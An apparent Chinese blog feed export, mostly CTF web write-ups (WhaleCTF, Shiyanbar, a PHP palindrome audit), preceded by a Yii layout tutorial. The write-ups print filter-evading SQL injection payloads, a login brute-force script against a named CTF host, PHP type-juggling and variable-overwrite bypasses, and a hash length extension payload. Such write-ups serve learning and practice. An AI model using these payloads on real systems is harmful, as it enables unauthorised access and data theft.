title="布局文件"></a>布局文件</h3><p>有时候多个HTML文件会出现冗余的部分，程序员不希望出现这种情况<br>于是我们就出现了布局文件把冗余的部分放在一个文件下方便调用</p><p>一般我们会在views下面的layouts文件夹新建布局文件<br>这里我在layouts文件夹下创建了一个名叫common.php的文件</p><p>把公共部分的代码放在common文件下</p><p>回到controller的文件下，这时候我们不能再使用<code>renderPartial</code>这个函数了，应该用<code>render</code>这个函数，也就是该为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'index'</span>);  <span class="comment">//这里的代码的作用是先把index视图里面的内容放到一个叫$content的变量里面，而且会把布局文件里面的内容显示出来</span></span><br></pre></td></tr></table></figure><p>但同时我们也要指定布局文件，所以我们要对应的类下面而不是控制器里面去定义<code>public $layout=&#39;布局文件名字&#39;</code></p><p>然后我们在common.php里面去添加<code>&lt;?=$content?&gt;</code><br>下面是我comon.php里面的代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span></span></span><br><span class="line"><span class="tag">          <span class="attr">content</span>=<span class="string">"width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="php"><span class="meta">&lt;?</span>=$content<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="视图里面显示视图"><a href="#视图里面显示视图" class="headerlink" title="视图里面显示视图"></a>视图里面显示视图</h3><p>在views文件夹下的hello下面再建立两个文件，一个是index.php一个是about.php 我们要想在index.php里面显示about.php里面的内容的话，需要在index.php里面加上</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们需要往about页面里面传进参数的话，这时候我们需要的是这里的render函数的第二个参数<br>但这第二个参数必须是一个数组，我们可以这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;render(<span class="string">'about'</span>,<span class="keyword">array</span>(<span class="string">'view_hello'</span>=&gt;<span class="string">'Hello about 2'</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们还需要把传进的参数在about页面上显示的话<br>我们要在about页面下添加<br><code>&lt;?=$view_hello?&gt;</code> 直接把数组的键值当成变量名在about页面输出即可</p>]]></content>
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程语言 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>WhaleCTF第一期打卡的几个web题目</title>
      <link href="/2018/04/06/whalectf-web1/"/>
      <url>/2018/04/06/whalectf-web1/</url>
      <content type="html"><![CDATA[<p>又发现一个很好的平台尝试做一下<br><a id="more"></a></p><h2 id="真的注入"><a href="#真的注入" class="headerlink" title="真的注入"></a>真的注入</h2><p>先输入’发现有报错，应该存在注入<br>然后尝试<br><code>1&#39; or &#39;1&#39;=&#39;1</code>发现被过滤了<br><!--more--><br>然后继续尝试发现<code>空格，union，or,and</code>被过滤了，当然这里也可以用bp的爆破功能去测试，还是很好用的<br>然后这题还有一个坑就是xss的提示，输入<code>&lt;&gt;</code>发现被过滤，这样我们就能够利用这一点去构造payload<br>而空格我们可以用<code>/**/</code>来绕过<br>下面是我的注入过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&apos;/**/o&lt;&gt;r/**/1=1#</span><br><span class="line">1&apos;/**/o&lt;&gt;rder/**/by/**/3#</span><br><span class="line">-1&apos;/**/un&lt;&gt;ion/**/sel&lt;&gt;ect/**/1,2,3# 发现没有回显，只能尝试报错注入或者盲注了，但盲注写脚本太麻烦我们尝试报错注入</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/database())),1)# 发现数据库，下面就是常规操作了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/table_name/**/from/**/info&lt;&gt;rmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),0x7e),1)#发现表名flag_0d9a，其实这里也可以用group_concat，没被过滤</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/coulmn_name/**/from/**/info&lt;&gt;rmation_schema.columns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#</span><br><span class="line">这里突然发现column被过滤掉了，只能双写绕过了</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/colcolumnsumn_name/**/from/**/info&lt;&gt;rmation_schema.colcolumnsumns/**/where/**/table_name=&apos;flag_0d9a&apos;/**/limit/**/0,1),0x7e),1)#发现列名flag</span><br><span class="line">1&apos;/**/a&lt;&gt;nd/**/updatexml(1,concat(0x7e,(sel&lt;&gt;ect/**/flag/**/from/**/flag_0d9a),0x7e),1)# 得到flag</span><br></pre></td></tr></table></figure><p>这一题又再一次复习了用&lt;&gt;还有双写绕过的技巧</p><h2 id="不明觉厉"><a href="#不明觉厉" class="headerlink" title="不明觉厉"></a>不明觉厉</h2><p>查看源码发现有<code>9s81jWjd98YU.php</code><br>查看发现是一个登录框，先要想想有没有注入<br>输入’发现没有过滤并且只有admin一个用户<br>只能用爆破了<br>这里学会了如何用绝对位置获取验证码<br>再次查看源码发现密码范围在(11111, 12111)，并且发现这里的username还有password都是以get方式去提交的<br>写个脚本爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(url)</span>:</span></span><br><span class="line">url = url</span><br><span class="line">Talk = requests.Session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">11111</span>, <span class="number">12112</span>):</span><br><span class="line">ans = Talk.get(url)</span><br><span class="line">Randcode = ans.content[ans.content.find(<span class="string">'randcode'</span>)+<span class="number">23</span>:ans.content.find(<span class="string">'randcode'</span>)+<span class="number">26</span>]</span><br><span class="line">res = Talk.get(url+<span class="string">'?username=admin&amp;password='</span>+str(i)+<span class="string">'&amp;randcode='</span>+Randcode)</span><br><span class="line"><span class="keyword">print</span> len(res.content)</span><br><span class="line"><span class="keyword">if</span> len(res.content)!=<span class="number">160</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Success! Your password is '</span>+str(i)+<span class="string">'\n'</span></span><br><span class="line"><span class="keyword">print</span> res.content</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]Attacked by 0verWatch'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">url = <span class="string">'http://daka.whaledu.com/web/web38/9s81jWjd98YU.php'</span></span><br><span class="line">solve(url)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Something Wrong!'</span></span><br></pre></td></tr></table></figure><p>最终得到flag</p><h2 id="等量登录"><a href="#等量登录" class="headerlink" title="等量登录"></a>等量登录</h2><p>首先查看源代码发现<code>index.phps</code><br>发现是代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$flag = <span class="string">'********'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">'name and password must be diffirent'</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">print</span> <span class="string">'invalid password'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这一题很简单，利用的是sha函数的漏洞去绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure><h2 id="强势替换"><a href="#强势替换" class="headerlink" title="强势替换"></a>强势替换</h2><p>又是一道代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($vs))&#123;</span><br><span class="line">    $Ff = trim(file_get_contents($fF));</span><br><span class="line">        <span class="keyword">if</span>($vs!=$Ff)&#123;</span><br><span class="line">    <span class="keyword">if</span>(md5($vs) == md5($Ff))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;p&gt;This is flag:"</span>.$flag.<span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="string">"&lt;p&gt;Variable extract!&lt;/&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"&lt;p&gt;Hacker!&lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>都是很简单的题目利用了extract全局变量覆盖还有file_get_contents函数为协议以及MD5弱类型比较的性质<br>构造payload:<code>?vs=QNKCDZO&amp;fF=php://input</code><br>post数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">s878926199a</span><br></pre></td></tr></table></figure><h2 id="正则进入"><a href="#正则进入" class="headerlink" title="正则进入"></a>正则进入</h2><p>查看源码没发现任何东西，只能去考虑源码泄露的问题了，试一下index.php~出现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"waht the hell?"</span>;</span><br><span class="line">$flag = <span class="string">"*******"</span>; </span><br><span class="line"><span class="keyword">if</span>  (<span class="string">"POST"</span> == $_SERVER[<span class="string">'REQUEST_METHOD'</span>]) </span><br><span class="line">&#123; </span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>]; </span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= preg_match(<span class="string">'/^[[:graph:]]&#123;12,&#125;$/'</span>, $password)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Wrong Format'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">TRUE</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        $reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr)) </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        $c = <span class="number">0</span>; </span><br><span class="line">        $ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>); </span><br><span class="line">        <span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password)) </span><br><span class="line">                $c += <span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">if</span> (<span class="string">"42"</span> == $password) <span class="keyword">echo</span> $flag; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">echo</span> <span class="string">'Wrong password'</span>; </span><br><span class="line">        <span class="keyword">exit</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先是一些预备知识</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[:graph:]匹配任何可见字符</span><br><span class="line"></span><br><span class="line">[:punct:]匹配任何标点符号</span><br><span class="line"></span><br><span class="line">[:digit:]匹配任何数字</span><br><span class="line"></span><br><span class="line">[:upper:]匹配任何大写字母</span><br><span class="line"></span><br><span class="line">[:lower:]匹配任何小写字母</span><br><span class="line"></span><br><span class="line">+表示一次及以上</span><br><span class="line"></span><br><span class="line">|表示或者</span><br></pre></td></tr></table></figure><p>/^[[:graph:]]{12,}$/匹配12个及以上的可见字符</p><p>/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/匹配标点、数字、大写字母、小写字母中的一个</p><p>结整段代码来看，我们需要post一个字符串，该字符串的值为42，并且要包含标点、数字、大写字母、小写字母中三个及以上类型，同时匹配次数要不小于6次<br>于是我们可以利用科学计数法去构造<br><code>password=42.000000e+0</code>或者是<code>420.00000e-1</code></p><h2 id="哈希入侵"><a href="#哈希入侵" class="headerlink" title="哈希入侵"></a>哈希入侵</h2><p>hash长度扩展攻击<br>可以用hashdump也可以用github上的脚本<br>以前的博客有些怎么用就不多说了<br>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role=root%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00P%00%00%00%00%00%00%00whaleCTF&amp;hash=aab9a3180e92bd4126d56011b672711f</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>实验吧 忘记密码了wp</title>
      <link href="/2018/03/18/shiyanba1-wp/"/>
      <url>/2018/03/18/shiyanba1-wp/</url>
      <content type="html"><![CDATA[<p>这个题一开始给了一个登录框<br>先不管输入东西抓一个包看一下<br><a id="more"></a><br>发现有几样有用的东西<br>第一个是admin对应的邮箱<a href="mailto:`admin@simplexue.com" target="_blank" rel="noopener">`admin@simplexue.com</a><code>第二个是一个Vim。。。。这里就要讲一下一个知识点一、vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带</code>~`的备份文件，某些情况下可以对其下载进行查看；</p><p>eg:<br>index.php普遍意义上的首页，输入域名不一定会显示。   它的备份文件则为index.php~<br>这里我又想到了文件绕过有时候需要PHP的别名<code>php1，php2，php3，php4，php5，phtml</code>等。。。</p><p>二、vim临时文件<br>vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件 .submit.swp。如果文件正常退出，则此文件自动删除。</p><p>比赛的时候多试几个名字，可能会这样<code>submit.php.swp,submit.swp,.submit.php.swp</code>，因为出题人可能出纰漏</p><p>还有一个可利用的路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./step2.php?email=youmail@mail.com&amp;check=???????</span><br></pre></td></tr></table></figure><p>进去看看发现了<code>submit.php</code>，进到这个页面<br>提示我不是admin…<br>就尝试一下几个源码泄露的文件名<br>.submit.php.swp出现了一部分源码<br>关键部分是下面这部分<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($token)&amp;&amp;!<span class="keyword">empty</span>($emailAddress))&#123;</span><br><span class="line"><span class="keyword">if</span>(strlen($token)!=<span class="number">10</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line"><span class="keyword">if</span>($token!=<span class="string">'0'</span>) <span class="keyword">die</span>(<span class="string">'fail'</span>);</span><br><span class="line">$sql = <span class="string">"SELECT count(*) as num from `user` where token='$token' AND email='$emailAddress'"</span>;</span><br><span class="line">$r = mysql_query($sql) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'db error'</span>);</span><br><span class="line">$r = mysql_fetch_assoc($r);</span><br><span class="line">$r = $r[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>($r&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"澶辫触浜嗗憖"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>既然不是admin，我们就想起来刚才有用的条件<br>admin的邮箱。。对应emailAddress变量<br>而token按在代码的意思就是只要token等于0并且满足10位的长度即可。<br>那我们构造<code>token=0000000000</code></p><p>发包即可，我的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /10/upload/submit.php?emailAddress=admin@simplexue.com&amp;token=0000000000 HTTP/1.1</span><br><span class="line">Host: ctf5.shiyanbar.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:58.0) Gecko/20100101 Firefox/58.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1521036323,1521095482,1521202069,1521267229; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*132367%2CnickName%3A0verWatch; Hm_lpvt_34d6f7353ab0915a4c582e4516dffbc3=1521269078; PHPSESSID=7in5h4q423rsfsmv6123rlab84</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记一道代码审计题目</title>
      <link href="/2018/03/18/phpcheck2/"/>
      <url>/2018/03/18/phpcheck2/</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个题目好像做了两遍了。。。。从这道题目里面学到的东西还是需要记录一下</p><a id="more"></a><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = <span class="string">""</span>; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=<span class="string">"xxxxxxxxxx"</span>;</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_error"</span>, <span class="keyword">false</span>); </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">   header(<span class="string">"hint:6c525af4059b4fe7d8c33a.txt"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">die</span>(<span class="string">"have a fun!!"</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>([$_POST] <span class="keyword">as</span> $global_var) &#123; </span><br><span class="line">    <span class="keyword">foreach</span>($global_var <span class="keyword">as</span> $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_palindrome_number</span><span class="params">($number)</span> </span>&#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = <span class="number">0</span>; </span><br><span class="line">    $j = strlen($number) - <span class="number">1</span>; </span><br><span class="line">    <span class="keyword">while</span>($i &lt; $j) &#123; </span><br><span class="line">        <span class="keyword">if</span>($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_numeric($_REQUEST[<span class="string">'number'</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=<span class="string">"sorry, you cann't input a number!"</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">elseif</span>($req[<span class="string">'number'</span>]!=strval(intval($req[<span class="string">'number'</span>])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = <span class="string">"number must be equal to it's integer!! "</span>;  </span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[<span class="string">"number"</span>]);</span><br><span class="line">     $value2 = intval(strrev($req[<span class="string">"number"</span>]));  </span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>($value1!=$value2)&#123;</span><br><span class="line">          $info=<span class="string">"no, this is not a palindrome number!"</span>;</span><br><span class="line">     &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          </span><br><span class="line">          <span class="keyword">if</span>(is_palindrome_number($req[<span class="string">"number"</span>]))&#123;</span><br><span class="line">              $info = <span class="string">"nice! &#123;$value1&#125; is a palindrome number!"</span>; </span><br><span class="line">          &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $info;</span><br></pre></td></tr></table></figure><p>直接来看代码<br>分析过后我们发现这段代码得满足四个条件<br>1.必须是字符串<br>2.参数number与变换为整形再变换为字符串的number相等<br>3.number参数反转后必须相等<br>4.不是水仙花数</p><p>似乎1跟2条件冲突，3跟4条件也冲突，如何构造呢？<br>下面就给出两种办法</p><p>1.<code>number=0e00%00或者0e00%20</code><br>  这里的%00表示空字符串，%20表示是空格，这样一来就满足了上述四个条件<br>  